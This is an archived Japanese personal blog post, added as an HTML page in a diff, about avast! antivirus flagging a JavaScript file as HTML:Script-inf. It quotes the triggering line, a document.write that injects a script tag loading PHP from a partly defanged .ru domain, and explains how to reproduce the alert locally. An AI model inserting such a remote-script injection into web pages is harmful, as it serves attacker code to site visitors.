@@ -1,0 +1,88 @@
+<!doctype html>
+<html lang="ja">
+  <head>
+    <meta charset="utf-8">
+    <title>avast! が特定文字列へ HTML:Script-inf をアラート | 旧それなりブログ</title>
+  </head>
+  <body>
+    <header>
+      <p>旧それなりブログの跡地</p>
+      <nav>
+        <ul>
+          <li><a href="https://kjirou.github.io/old-sorenari-blog/">トップへ</a></li>
+          <li><a href="https://kjirou.github.io/blog/">新ブログへ</a></li>
+        </ul>
+      </nav>
+    </header>
+    <article>
+      <section>
+        <h1>avast! が特定文字列へ HTML:Script-inf をアラート</h1>
+        <p>2009年12月15日</p>
+      </section>
+      <section>
+        <div>
+個人用PCは avast! を使いまくりなんですが、<br />
+とあるサイトを見たときに、原因不明なエラーが出まして、<br />
+その一部始終のメモとなります。</p>
+<p>バージョンは、「avast! version 4.8 Home Edition」です。<br />
+ブラウザ環境は Windows-XP ＋ IE です。（FireFoxだと出ない）
+</div>
+<h3>avast!が出した警告内容</h3>
+<div>
+<a href="http://photozou.jp/photo/show/135065/30579977" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://photozou.jp/photo/show/135065/30579977', '']);" ><img src="http://art19.photozou.jp/pub/65/135065/photo/30579977.png" alt="avast-alert1215" width="439" height="430" style="border:0" /></a><br /><a href="http://photozou.jp/photo/show/135065/30579977" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://photozou.jp/photo/show/135065/30579977', 'avast-alert1215']);" >avast-alert1215</a> posted by <a href="http://photozou.jp/user/top/135065" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://photozou.jp/user/top/135065', '(C)kjirou']);" >(C)kjirou</a></p>
+<p>↓ウィルス内容部分の拡大</p>
+<pre>
+マルウェアの名前   = HTML:Script-inf
+マルウェアのタイプ = ウイルス/ワーム
+VPSバージョン      = 091214-1, 2009/12/14
+</pre>
+<p>
+んで、上記画像だと消しちゃってますが、<br />
+どのファイルに反応しているかというと、とあるJavaScriptファイル(普通に .js の)でした。
+</div>
+<h3>何に反応してアラート？</h3>
+<div>
+結論から申しますと・・・</p>
+<pre>
+document.write('&lt;script src=http://pok＠＠＠upca.ru/delivery/ug_gl_l_v.php &gt;&lt;/script&gt;');
+</pre>
+<p>JSソース内の、この行部分に反応してアラートを出しておりました。</p>
+<p><b>!! 途中の ＠＠＠ は本当はありません  !!</b><br />
+<b>!! ただ、そのまま書くと avast! が反応しちゃうことがあるので、挿入しています  !!</b></p>
+<p>この行を消すと、出なくなりました。
+</p></div>
+<h3>もっと簡単にアラートを出す</h3>
+<div>
+上記ではサイトに置いたjsファイルに反応しましたが、<br />
+ローカルに上記ソースを書いて保存してもアラートされます。</p>
+<p>例えば、以下の手順で意図的に発生させることができます。</p>
+<p>任意の.js拡張子のファイルをデスクトップに作って<br />
+　↓<br />
+上記のdocument.write行のソースを、＠＠＠を取って貼り付けて<br />
+　↓<br />
+テキストエディタの保存を行おうとすると、avast! が警告を出します。</p>
+<p>
+どうも、行と完全一致的に反応するようで、<br />
+document.write や script や 謎の海外ドメイン や phpスクリプト名<br />
+それぞれに反応はしません。<br />
+なので、ドメインでもパスでも、どこか1文字を削って保存した場合は問題有りません。
+</div>
+<h3>HTML:Script-inf って？</h3>
+<div>
+んで、肝心の何が悪いかについては、わからねっす。</p>
+<p>ググっても出ないし、avast! サイトを軽く探しても見つからないので、<br />
+興味のあったり親切な方は、<a href="http://www.avast.com/" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'http://www.avast.com/', '公式サイト']);" target="_blank">公式サイト</a>を探して教えて下さい・・・。</p>
+<p>推測ですが、かつて実害のあったスクリプトのパターンを、<br />
+avast! がホワイトリスト的に弾いてるんじゃないかなぁ、と。
+</div>
+<h3>現状の実害は？</h3>
+<div>
+そもそも、そのサイトが何のサイトかすら、よくわからなく・・・。</p>
+<p>まぁ、知らない内にサイトに設置してあるJSファイルに書かれてたりしたら、<br />
+絶対消した方がいいとだけは言えますけども。
+</div>
+
+      </section>
+    </article>
+  </body>
+</html>
